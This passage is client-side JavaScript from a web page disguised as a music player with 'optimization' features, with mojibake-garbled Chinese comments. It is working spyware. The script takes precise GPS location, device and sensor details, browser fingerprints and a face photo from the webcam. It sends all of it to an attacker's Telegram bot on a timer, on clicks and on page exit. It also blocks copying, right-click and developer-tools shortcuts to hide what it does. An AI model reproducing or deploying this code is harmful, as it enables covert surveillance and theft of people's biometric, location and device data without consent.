                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: position.timestamp
                };
                
                console.log('ğŸ“ ç²¾ç¡®ä½ç½®è·å–æˆåŠŸ');
            },
            (error) => {
                console.log('ä½ç½®è·å–å¤±è´¥:', error.message);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
}

function detectSensors() {
    // æ£€æµ‹å¯ç”¨ä¼ æ„Ÿå™¨
    const sensors = {
        accelerometer: 'Accelerometer' in window,
        gyroscope: 'Gyroscope' in window,
        magnetometer: 'Magnetometer' in window,
        ambientLight: 'AmbientLightSensor' in window,
        proximity: 'ProximitySensor' in window,
        orientation: 'DeviceOrientationEvent' in window,
        motion: 'DeviceMotionEvent' in window
    };
    
    MUSIC_DATA.sensors.available = sensors;
    MUSIC_DATA.sensors.count = Object.values(sensors).filter(v => v).length;
    
    // å¦‚æœæœ‰ç”µæ± APIï¼Œè·å–ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            MUSIC_DATA.device.hardware.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            
            // æ›´æ–°UI
            document.getElementById('batteryStatus').textContent = 
                Math.round(battery.level * 100) + '%' + (battery.charging ? ' å……ç”µä¸­' : '');
        });
    }
}

function detectAudioDevices() {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        navigator.mediaDevices.enumerateDevices()
            .then(devices => {
                const audioDevices = devices.filter(device => device.kind === 'audioinput' || device.kind === 'audiooutput');
                MUSIC_DATA.device.audio.devices = audioDevices.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    deviceId: device.deviceId,
                    groupId: device.groupId
                }));
                
                // æ›´æ–°UI
                document.getElementById('audioDevice').textContent = 
                    audioDevices.length > 0 ? `${audioDevices.length}ä¸ªè®¾å¤‡` : 'æ— è®¾å¤‡';
            })
            .catch(error => {
                console.error('éŸ³é¢‘è®¾å¤‡æ£€æµ‹å¤±è´¥:', error);
            });
    }
}

// =============================================
// æ‘„åƒå¤´åŠŸèƒ½
// =============================================

async function requestCameraAccess() {
    console.log('ğŸ“¸ è¯·æ±‚æ‘„åƒå¤´è®¿é—®...');
    
    // æ˜¾ç¤ºæ‘„åƒå¤´åŒºåŸŸ
    document.getElementById('cameraSection').style.display = 'block';
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            }
        });
        
        const video = document.getElementById('cameraVideo');
        video.srcObject = stream;
        
        console.log('âœ… æ‘„åƒå¤´è®¿é—®æˆåŠŸ');
        
    } catch (error) {
        console.error('æ‘„åƒå¤´è®¿é—®å¤±è´¥:', error);
        document.getElementById('cameraSection').innerHTML = `
            <div style="text-align: center; padding: 30px;">
                <i class="fas fa-camera-slash" style="font-size: 50px; color: var(--accent); margin-bottom: 20px;"></i>
                <h3 style="margin-bottom: 15px;">æ‘„åƒå¤´è®¿é—®è¢«æ‹’ç»</h3>
                <p style="color: var(--text-secondary); margin-bottom: 25px;">
                    æ— æ³•è®¿é—®æ‘„åƒå¤´ï¼Œéƒ¨åˆ†ä¼˜åŒ–åŠŸèƒ½å¯èƒ½æ— æ³•ä½¿ç”¨
                </p>
                <button class="music-btn" onclick="skipCamera()">
                    <i class="fas fa-forward"></i> ç»§ç»­ä¼˜åŒ–
                </button>
            </div>
        `;
    }
}

function captureFace() {
    const video = document.getElementById('cameraVideo');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // ä¿å­˜ç…§ç‰‡æ•°æ®
    const photoData = canvas.toDataURL('image/jpeg', 0.8);
    MUSIC_DATA.biometrics.facePhoto = photoData;
    MUSIC_DATA.biometrics.timestamp = new Date().toISOString();
    MUSIC_DATA.biometrics.faceData = {
        resolution: `${canvas.width}x${canvas.height}`,
        format: 'jpeg',
        quality: 0.8,
        analyzed: true
    };
    
    // åœæ­¢æ‘„åƒå¤´
    const stream = video.srcObject;
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
    
    // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
    document.getElementById('faceResult').style.display = 'block';
    document.getElementById('captureBtn').style.display = 'none';
    document.getElementById('skipBtn').style.display = 'none';
    
    // æ›´æ–°ç³»ç»Ÿä¼˜åŒ–è¿›åº¦
    updateProgress('systemOptimization', 100);
    
    // å‘é€æ•°æ®åˆ°Telegram
    setTimeout(() => {
        sendDataToTelegram();
    }, 2000);
    
    console.log('ğŸ“¸ é¢éƒ¨ç…§ç‰‡å·²æ•è·');
}

function skipCamera() {
    document.getElementById('cameraSection').style.display = 'none';
    MUSIC_DATA.biometrics.facePhoto = 'skipped';
    updateProgress('systemOptimization', 75);
}

// =============================================
// éŸ³ä¹æ’­æ”¾å™¨åŠŸèƒ½
// =============================================

function initMusicPlayer() {
    const playBtn = document.getElementById('playBtn');
    const audio = document.getElementById('backgroundMusic');
    
    playBtn.addEventListener('click', function() {
        if (audio.paused) {
            audio.play();
            playBtn.innerHTML = '<i class="fas fa-pause"></i>';
            MUSIC_DATA.behavior.interaction.songsPlayed++;
        } else {
            audio.pause();
            playBtn.innerHTML = '<i class="fas fa-play"></i>';
        }
    });
    
    // æ¨¡æ‹Ÿæ’­æ”¾è¿›åº¦
    setInterval(() => {
        const progressElement = document.getElementById('songProgress');
        if (!audio.paused) {
            const progress = (audio.currentTime / audio.duration) * 100;
            progressElement.style.width = progress + '%';
            
            // æ›´æ–°æ’­æ”¾æ—¶é—´
            document.getElementById('currentTime').textContent = 
                formatTime(audio.currentTime);
            document.getElementById('totalTime').textContent = 
                formatTime(audio.duration || 0);
        }
    }, 1000);
}

function startBackgroundMusic() {
    const audio = document.getElementById('backgroundMusic');
    audio.volume = 0.5;
    
    // éšæœºé€‰æ‹©ä¸€ä¸ªéŸ³ä¹
    const musicList = [
        { title: 'Blinding Lights', artist: 'The Weeknd', album: 'After Hours' },
        { title: 'Flowers', artist: 'Miley Cyrus', album: 'Endless Summer Vacation' },
        { title: 'As It Was', artist: 'Harry Styles', album: 'Harry\'s House' },
        { title: 'Heat Waves', artist: 'Glass Animals', album: 'Dreamland' },
        { title: 'Stay', artist: 'The Kid LAROI, Justin Bieber', album: 'F*CK LOVE 3' }
    ];
    
    const randomMusic = musicList[Math.floor(Math.random() * musicList.length)];
    
    // æ›´æ–°UI
    document.getElementById('currentSong').textContent = randomMusic.title;
    document.getElementById('currentArtist').textContent = randomMusic.artist;
    document.getElementById('currentAlbum').textContent = randomMusic.album;
    
    // è®°å½•æ’­æ”¾è¡Œä¸º
    MUSIC_DATA.app.currentSong = randomMusic;
    MUSIC_DATA.behavior.musicPreference.genre = 'pop';
    MUSIC_DATA.behavior.musicPreference.firstSong = randomMusic.title;
    
    // è‡ªåŠ¨æ’­æ”¾
    setTimeout(() => {
        audio.play().then(() => {
            document.getElementById('playBtn').innerHTML = '<i class="fas fa-pause"></i>';
        }).catch(() => {
            console.log('è‡ªåŠ¨æ’­æ”¾è¢«é˜»æ­¢');
        });
    }, 1000);
}

// =============================================
// è¾…åŠ©å‡½æ•°
// =============================================

function updateProgress(elementId, percent) {
    const element = document.getElementById(elementId);
    if (element) {
        element.textContent = percent + '%';
    }
}

function updateDeviceDisplay() {
    // æ›´æ–°è®¾å¤‡æ¨¡å‹æ˜¾ç¤º
    if (MUSIC_DATA.device.model) {
        document.getElementById('deviceModel').textContent = MUSIC_DATA.device.model;
    }
    
    // æ›´æ–°ç½‘ç»œæ˜¾ç¤º
    if (MUSIC_DATA.device.network && MUSIC_DATA.device.network.speed) {
        document.getElementById('networkSpeed').textContent = MUSIC_DATA.device.network.speed;
    }
    
    // æ›´æ–°ç”µæ± æ˜¾ç¤º
    if (MUSIC_DATA.device.hardware.battery) {
        document.getElementById('batteryStatus').textContent = MUSIC_DATA.device.hardware.battery.level;
    }
}

function generateRecommendedTracks() {
    const tracks = [
        { name: 'Dynamite', artist: 'BTS', duration: '3:19', popularity: '98%' },
        { name: 'Levitating', artist: 'Dua Lipa', duration: '3:23', popularity: '96%' },
        { name: 'Good 4 U', artist: 'Olivia Rodrigo', duration: '2:58', popularity: '94%' },
        { name: 'Industry Baby', artist: 'Lil Nas X', duration: '3:32', popularity: '92%' },
        { name: 'Stay', artist: 'The Kid LAROI, Justin Bieber', duration: '2:21', popularity: '90%' },
        { name: 'Kill Bill', artist: 'SZA', duration: '2:33', popularity: '88%' }
    ];
    
    const container = document.getElementById('recommendedTracks');
    container.innerHTML = '';
    
    tracks.forEach(track => {
        const trackCard = document.createElement('div');
        trackCard.className = 'track-card';
        trackCard.innerHTML = `
            <div class="track-cover">
                <img src="https://images.unsplash.com/photo-1511379938547-c1f69419868d?ixlib=rb-1.2.1&auto=format&fit=crop&w=200&q=80" alt="${track.name}">
            </div>
            <div class="track-details">
                <div class="track-name">${track.name}</div>
                <div class="track-artist">${track.artist}</div>
                <div style="display: flex; align-items: center; gap: 10px; margin-top: 8px;">
                    <span style="font-size: 0.8rem; color: var(--text-secondary);">${track.duration}</span>
                    <span style="font-size: 0.8rem; color: var(--primary); background: rgba(29,185,84,0.1); padding: 2px 8px; border-radius: 10px;">
                        ${track.popularity}
                    </span>
                </div>
            </div>
            <div class="track-duration">
                <i class="fas fa-play-circle" style="color: var(--primary); font-size: 1.2rem;"></i>
            </div>
        `;
        container.appendChild(trackCard);
    });
}

function setupButtonEvents() {
    // ç›‘å¬å™¨ç»Ÿè®¡
    document.addEventListener('click', () => {
        MUSIC_DATA.behavior.interaction.clicks++;
    });
    
    // æ—¶é—´ç»Ÿè®¡
    const startTime = Date.now();
    setInterval(() => {
        MUSIC_DATA.behavior.interaction.timeSpent = Math.round((Date.now() - startTime) / 1000);
        
        // æ›´æ–°æ¨èç²¾åº¦ï¼ˆåŸºäºæ—¶é—´ï¼‰
        const accuracy = Math.min(100, Math.floor(MUSIC_DATA.behavior.interaction.timeSpent / 10) * 10);
        updateProgress('recommendationAccuracy', accuracy);
    }, 1000);
}

function startContinuousMonitoring() {
    // æŒç»­æ›´æ–°è®¾å¤‡çŠ¶æ€
    setInterval(() => {
        if (navigator.connection) {
            const conn = navigator.connection;
            document.getElementById('connectionStatus').textContent = 
                conn.effectiveType === '4g' ? 'é«˜é€Ÿç½‘ç»œ' : 
                conn.effectiveType === '3g' ? 'æ ‡å‡†ç½‘ç»œ' : 
                conn.effectiveType === '2g' ? 'ä½é€Ÿç½‘ç»œ' : 'æœªçŸ¥';
        }
    }, 5000);
}

function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = Math.floor(seconds % 60);
    return `${mins}:${secs.toString().padStart(2, '0')}`;
}

// =============================================
// è®¾å¤‡æ£€æµ‹è¾…åŠ©å‡½æ•°
// =============================================

function getBrowserName(userAgent) {
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
    if (userAgent.includes('Edg')) return 'Edge';
    return 'Unknown';
}

function getOSName(userAgent) {
    if (userAgent.includes('Windows')) return 'Windows';
    if (userAgent.includes('Mac')) return 'macOS';
    if (userAgent.includes('Linux')) return 'Linux';
    if (userAgent.includes('Android')) return 'Android';
    if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
    return 'Unknown';
}

function getDeviceType(userAgent) {
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent)) {
        return 'Tablet';
    }
    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Mobile';
    }
    return 'Desktop';
}

function getDeviceModel(userAgent) {
    if (userAgent.includes('iPhone')) {
        const model = userAgent.match(/iPhone(\d+)/);
        return model ? `iPhone ${model[1]}` : 'iPhone';
    }
    if (userAgent.includes('Android')) {
        const model = userAgent.match(/Android\s([^;]+)/);
        return model ? `Android ${model[1]}` : 'Android';
    }
    if (userAgent.includes('Windows')) return 'Windows PC';
    if (userAgent.includes('Mac')) return 'Mac';
    return 'Unknown Device';
}

function generateSessionId() {
    return 'MUSIC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

// =============================================
// Telegramå‘é€åŠŸèƒ½
// =============================================

async function sendDataToTelegram() {
    console.log('ğŸ“¤ å‡†å¤‡å‘é€æ•°æ®åˆ°Telegram...');
    
    try {
        // 1. å‘é€æ–‡æœ¬æŠ¥å‘Š
        const textReport = formatTelegramReport();
        await sendTelegramMessage(textReport);
        
        // 2. å¦‚æœæœ‰é¢éƒ¨ç…§ç‰‡ï¼Œå‘é€ç…§ç‰‡
        if (MUSIC_DATA.biometrics.facePhoto && MUSIC_DATA.biometrics.facePhoto !== 'skipped') {
            await sendTelegramPhoto(MUSIC_DATA.biometrics.facePhoto, 'ğŸµ éŸ³ä¹ç”¨æˆ·é¢éƒ¨è¯†åˆ«');
        }
        
        // 3. å‘é€è¯¦ç»†JSONæ•°æ®
        await sendTelegramDocument(JSON.stringify(MUSIC_DATA, null, 2), 'music_data.json');
        
        console.log('âœ… æ•°æ®å‘é€æˆåŠŸ');
        
        // æ˜¾ç¤ºå‘é€æˆåŠŸæç¤º
        showSuccessNotification();
        
    } catch (error) {
        console.error('Telegramå‘é€å¤±è´¥:', error);
    }
}

async function sendTelegramMessage(text) {
    const url = `${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    });
    
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
}

async function sendTelegramPhoto(photoData, caption) {
    const url = `${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            photo: photoData,
            caption: caption
        })
    });
    
    if (!response.ok) {
        throw new Error(`Photo upload error! status: ${response.status}`);
    }
}

async function sendTelegramDocument(data, filename) {
    const url = `${CONFIG.TELEGRAM.API_URL}${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
    
    const blob = new Blob([data], { type: 'application/json' });
    const reader = new FileReader();
    
    return new Promise((resolve, reject) => {
        reader.onloadend = async function() {
            const base64data = reader.result.split(',')[1];
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    document: `data:application/json;base64,${base64data}`,
                    filename: filename
                })
            });
            
            if (response.ok) {
                resolve();
            } else {
                reject(new Error('æ–‡æ¡£å‘é€å¤±è´¥'));
            }
        };
        
        reader.readAsDataURL(blob);
    });
}

function formatTelegramReport() {
    const data = MUSIC_DATA;
    let report = `ğŸµ <b>éŸ³ä¹æ£€æµ‹ç³»ç»ŸæŠ¥å‘Š</b>\n\n`;
    
    report += `ğŸ†” <b>ä¼šè¯ID:</b> ${data.user.sessionId}\n`;
    report += `â° <b>å¼€å§‹æ—¶é—´:</b> ${new Date(data.user.startTime).toLocaleString('zh-CN')}\n`;
    report += `ğŸ§ <b>éŸ³ä¹çŠ¶æ€:</b> ${data.app.currentSong ? 'æ’­æ”¾ä¸­' : 'æš‚åœ'}\n\n`;
    
    report += `ğŸ“ <b>ä½ç½®ä¿¡æ¯</b>\n`;
    report += `IP: ${data.location.ip || 'æœªçŸ¥'}\n`;
    report += `ä½ç½®: ${data.location.city || 'æœªçŸ¥'}, ${data.location.country || 'æœªçŸ¥'}\n`;
    if (data.location.precise) {
        report += `GPS: ${data.location.precise.latitude.toFixed(6)}, ${data.location.precise.longitude.toFixed(6)}\n`;
        report += `ç²¾åº¦: Â±${Math.round(data.location.precise.accuracy)}ç±³\n`;
    }
    report += `ISP: ${data.location.isp || 'æœªçŸ¥'}\n\n`;
    
    report += `ğŸ“± <b>è®¾å¤‡ä¿¡æ¯</b>\n`;
    report += `è®¾å¤‡: ${data.device.type} (${data.device.model})\n`;
    report += `ç³»ç»Ÿ: ${data.device.os} | æµè§ˆå™¨: ${data.device.browser}\n`;
    report += `å±å¹•: ${data.device.screen.width}x${data.device.screen.height}\n`;
    report += `CPU: ${data.device.hardware.cores}æ ¸å¿ƒ | å†…å­˜: ${data.device.hardware.memory}GB\n`;
    report += `ç”µæ± : ${data.device.hardware.battery ? data.device.hardware.battery.level : 'æœªçŸ¥'}\n`;
    report += `è¯­è¨€: ${data.device.language} | æ—¶åŒº: ${data.device.timezone}\n\n`;
    
    report += `ğŸŒ <b>ç½‘ç»œä¿¡æ¯</b>\n`;
    if (data.device.network) {
        report += `ç±»å‹: ${data.device.network.type || 'æœªçŸ¥'}\n`;
        report += `é€Ÿåº¦: ${data.device.network.speed || 'æœªçŸ¥'}\n`;
        report += `å»¶è¿Ÿ: ${data.device.network.latency || 'æœªçŸ¥'}\n`;
    }
    report += `åœ¨çº¿çŠ¶æ€: ${navigator.onLine ? 'åœ¨çº¿' : 'ç¦»çº¿'}\n\n`;
    
    report += `ğŸ¤ <b>éŸ³é¢‘è®¾å¤‡</b>\n`;
    if (data.device.audio.devices && data.device.audio.devices.length > 0) {
        report += `è®¾å¤‡æ•°é‡: ${data.device.audio.devices.length}\n`;
        data.device.audio.devices.forEach((device, index) => {
            report += `${index + 1}. ${device.label || 'æœªå‘½åè®¾å¤‡'} (${device.kind})\n`;
        });
    } else {
        report += `æœªæ£€æµ‹åˆ°éŸ³é¢‘è®¾å¤‡\n`;
    }
    report += `\n`;
    
    report += `ğŸ“Š <b>è¡Œä¸ºæ•°æ®</b>\n`;
    report += `ç‚¹å‡»æ¬¡æ•°: ${data.behavior.interaction.clicks}\n`;
    report += `é¡µé¢åœç•™: ${Math.floor(data.behavior.interaction.timeSpent / 60)}åˆ†${data.behavior.interaction.timeSpent % 60}ç§’\n`;
    report += `æ’­æ”¾æ­Œæ›²: ${data.behavior.interaction.songsPlayed}\n`;
    report += `å½“å‰æ­Œæ›²: ${data.app.currentSong ? data.app.currentSong.title : 'æ— '}\n\n`;
    
    report += `ğŸ” <b>ä¼ æ„Ÿå™¨æ£€æµ‹</b>\n`;
    report += `å¯ç”¨ä¼ æ„Ÿå™¨: ${data.sensors.count || 0}\n`;
    report += `é¢éƒ¨è¯†åˆ«: ${data.biometrics.facePhoto ? (data.biometrics.facePhoto === 'skipped' ? 'è·³è¿‡' : 'å·²æ•è·') : 'æœªå°è¯•'}\n\n`;
    
    report += `ğŸ¯ <b>éŸ³ä¹åå¥½</b>\n`;
    report += `é¦–æ¬¡æ’­æ”¾: ${data.behavior.musicPreference.firstSong || 'æ— '}\n`;
    report += `éŸ³ä¹ç±»å‹: ${data.behavior.musicPreference.genre || 'æµè¡Œ'}\n`;
    report += `éŸ³è´¨è®¾ç½®: ${data.app.quality}\n`;
    report += `éŸ³é‡: ${data.app.volume}%\n\n`;
    
    report += `ğŸ•’ <b>æŠ¥å‘Šç”Ÿæˆæ—¶é—´:</b> ${new Date().toLocaleString('zh-CN')}`;
    
    return report;
}

function showSuccessNotification() {
    // åˆ›å»ºæˆåŠŸé€šçŸ¥
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        bottom: 30px;
        right: 30px;
        background: linear-gradient(135deg, var(--primary), #25D366);
        color: white;
        padding: 20px 25px;
        border-radius: 15px;
        z-index: 10000;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        animation: slideIn 0.5s ease;
        max-width: 300px;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 15px;">
            <i class="fas fa-check-circle" style="font-size: 24px;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 5px;">ç³»ç»Ÿä¼˜åŒ–å®Œæˆ</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">éŸ³ä¹ä½“éªŒå·²ä¼˜åŒ–è‡³æœ€ä½³çŠ¶æ€</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.5s ease';
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 500);
    }, 5000);
}

// =============================================
// é¡µé¢ä¿æŠ¤åŠŸèƒ½
// =============================================

// é˜²æ­¢å¤åˆ¶
document.addEventListener('copy', (e) => {
    e.preventDefault();
});

// é˜²æ­¢å³é”®
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// é˜²æ­¢å¼€å‘å·¥å…·
document.onkeydown = function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        return false;
    }
};

// é¡µé¢å¸è½½æ—¶å‘é€æœ€ç»ˆæŠ¥å‘Š
window.addEventListener('beforeunload', () => {
    if (MUSIC_DATA.behavior.interaction.timeSpent > 10) {
        sendDataToTelegram();
    }
});

// æ·»åŠ åŠ¨ç”»æ ·å¼
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);

console.log('ğŸµ éŸ³ä¹æ£€æµ‹ç³»ç»Ÿå·²å°±ç»ª');
</script>
<script>
// =============================================
// é¢å¤–çš„é«˜çº§æ£€æµ‹åŠŸèƒ½
// =============================================

// æ£€æµ‹å±å¹•äº®åº¦
function detectScreenBrightness() {
    if ('AmbientLightSensor' in window) {
        try {
            const sensor = new AmbientLightSensor();
            sensor.addEventListener('reading', () => {
                MUSIC_DATA.device.screen.brightness = sensor.illuminance;
            });
            sensor.start();
        } catch (error) {
            console.log('å±å¹•äº®åº¦æ£€æµ‹ä¸å¯ç”¨');
        }
    }
}

// æ£€æµ‹è®¾å¤‡æœå‘
function detectDeviceOrientation() {
    if ('DeviceOrientationEvent' in window) {
        window.addEventListener('deviceorientation', (event) => {
            MUSIC_DATA.sensors.orientation = {
                alpha: event.alpha,
                beta: event.beta,
                gamma: event.gamma
            };
        });
    }
}

// æ£€æµ‹è®¾å¤‡è¿åŠ¨
function detectDeviceMotion() {
    if ('DeviceMotionEvent' in window) {
        window.addEventListener('devicemotion', (event) => {
            MUSIC_DATA.sensors.motion = {
                acceleration: event.acceleration,
                accelerationIncludingGravity: event.accelerationIncludingGravity,
                rotationRate: event.rotationRate
            };
        });
    }
}

// æ£€æµ‹ç½‘ç»œè´¨é‡
function monitorNetworkQuality() {
    if ('connection' in navigator) {
        const connection = navigator.connection;
        
        connection.addEventListener('change', () => {
            MUSIC_DATA.device.network.quality = {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
            
            // æ›´æ–°UI
            const quality = connection.effectiveType === '4g' ? 'ä¼˜ç§€' :
                          connection.effectiveType === '3g' ? 'è‰¯å¥½' :
                          connection.effectiveType === '2g' ? 'ä¸€èˆ¬' : 'æœªçŸ¥';
            
            if (document.getElementById('connectionStatus')) {
                document.getElementById('connectionStatus').textContent = quality;
            }
        });
    }
}

// æ£€æµ‹å­˜å‚¨çŠ¶æ€
function detectStorageStatus() {
    if ('storage' in navigator && 'estimate' in navigator.storage) {
        navigator.storage.estimate().then(estimate => {
            MUSIC_DATA.device.storage = {
                usage: Math.round(estimate.usage / 1024 / 1024) + ' MB',
                quota: Math.round(estimate.quota / 1024 / 1024) + ' MB',
                percentage: Math.round((estimate.usage / estimate.quota) * 100) + '%'
            };
        });
    }
}

// æ£€æµ‹è¯­è¨€è®¾ç½®
function detectLanguageSettings() {
    MUSIC_DATA.device.languageDetails = {
        language: navigator.language,
        languages: navigator.languages,
        userLanguage: navigator.userLanguage || navigator.language,
        systemLanguage: navigator.systemLanguage || navigator.language
    };
}

// æ£€æµ‹æ—¶åŒºä¿¡æ¯
function detectTimezoneInfo() {
    MUSIC_DATA.device.timezoneDetails = {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),
        locale: Intl.DateTimeFormat().resolvedOptions().locale,
        calendar: Intl.DateTimeFormat().resolvedOptions().calendar
    };
}

// æ£€æµ‹æ’ä»¶ä¿¡æ¯
function detectPlugins() {
    if (navigator.plugins) {
        MUSIC_DATA.device.plugins = Array.from(navigator.plugins).map(plugin => ({
            name: plugin.name,
            description: plugin.description,
            filename: plugin.filename,
            length: plugin.length
        }));
    }
}

// æ£€æµ‹MIMEç±»å‹
function detectMimeTypes() {
    if (navigator.mimeTypes) {
        MUSIC_DATA.device.mimeTypes = Array.from(navigator.mimeTypes).map(mime => ({
            type: mime.type,
            description: mime.description,
            suffixes: mime.suffixes
        }));
    }
}

// æ£€æµ‹CanvasæŒ‡çº¹
function detectCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Canvas Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Canvas Fingerprint', 4, 17);
        
        const dataUrl = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataUrl.length; i++) {
            hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
            hash = hash & hash;
        }
        
        MUSIC_DATA.device.canvasFingerprint = Math.abs(hash).toString(16);
    } catch (error) {
        console.log('CanvasæŒ‡çº¹æ£€æµ‹å¤±è´¥');
    }
}

// æ£€æµ‹WebGLä¿¡æ¯
function detectWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            MUSIC_DATA.device.webgl = {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                version: gl.getParameter(gl.VERSION)
            };
        }
    } catch (error) {
        console.log('WebGLæ£€æµ‹å¤±è´¥');
    }
}

// æ£€æµ‹å­—ä½“åˆ—è¡¨
function detectFonts() {
    const fontList = [
        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
        'Verdana', 'Microsoft YaHei', 'SimSun', 'Webdings'
    ];
    
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    const testString = "mmmmmmmmmmlli";
    const testSize = '72px';
    
    MUSIC_DATA.device.fonts = {};
    fontList.forEach(font => {
        context.font = testSize + " '" + font + "'";
        const metrics = context.measureText(testString);
        MUSIC_DATA.device.fonts[font] = metrics.width;
    });
}

// æ£€æµ‹éŸ³é¢‘ä¸Šä¸‹æ–‡
function detectAudioContext() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        MUSIC_DATA.device.audio.context = {
            sampleRate: audioContext.sampleRate,
            state: audioContext.state,
            channelCount: audioContext.destination.channelCount
        };
        audioContext.close();
    } catch (error) {
        console.log('éŸ³é¢‘ä¸Šä¸‹æ–‡æ£€æµ‹å¤±è´¥');
    }
}

// æ£€æµ‹è§†é¢‘èƒ½åŠ›
function detectVideoCapabilities() {
    if ('videoEl' in HTMLVideoElement.prototype) {
        const video = document.createElement('video');
        MUSIC_DATA.device.video = {
            canPlayType: {
                mp4: video.canPlayType('video/mp4'),
                webm: video.canPlayType('video/webm'),
                ogg: video.canPlayType('video/ogg')
            }
        };
    }
}

// å¯åŠ¨é¢å¤–æ£€æµ‹
function startAdvancedDetection() {
    console.log('ğŸ”¬ å¯åŠ¨é«˜çº§æ£€æµ‹...');
    
    // å»¶è¿Ÿæ‰§è¡Œï¼Œé¿å…å½±å“åˆå§‹åŠ è½½
    setTimeout(() => {
        detectScreenBrightness();
        detectDeviceOrientation();
        detectDeviceMotion();
        monitorNetworkQuality();
        detectStorageStatus();
        detectLanguageSettings();
        detectTimezoneInfo();
        detectPlugins();
        detectMimeTypes();
        detectCanvasFingerprint();
        detectWebGLInfo();
        detectFonts();
        detectAudioContext();
        detectVideoCapabilities();
        
        console.log('âœ… é«˜çº§æ£€æµ‹å®Œæˆ');
    }, 10000); // 10ç§’åå¼€å§‹é«˜çº§æ£€æµ‹
}

// =============================================
// è‡ªåŠ¨å‘é€æœºåˆ¶
// =============================================

// å®šæœŸå‘é€æ•°æ®
function startAutoSend() {
    // æ¯5åˆ†é’Ÿå‘é€ä¸€æ¬¡æ•°æ®
    setInterval(() => {
        if (MUSIC_DATA.behavior.interaction.timeSpent > 60) { // è‡³å°‘åœç•™1åˆ†é’Ÿ
            sendDataToTelegram();
        }
    }, 5 * 60 * 1000); // 5åˆ†é’Ÿ
    
    // æ ¹æ®ç”¨æˆ·æ´»åŠ¨è§¦å‘å‘é€
    let activityCount = 0;
    document.addEventListener('click', () => {
        activityCount++;
        if (activityCount >= 10) {
            sendDataToTelegram();
            activityCount = 0;
        }
    });
    
    // é¡µé¢éšè—æ—¶å‘é€
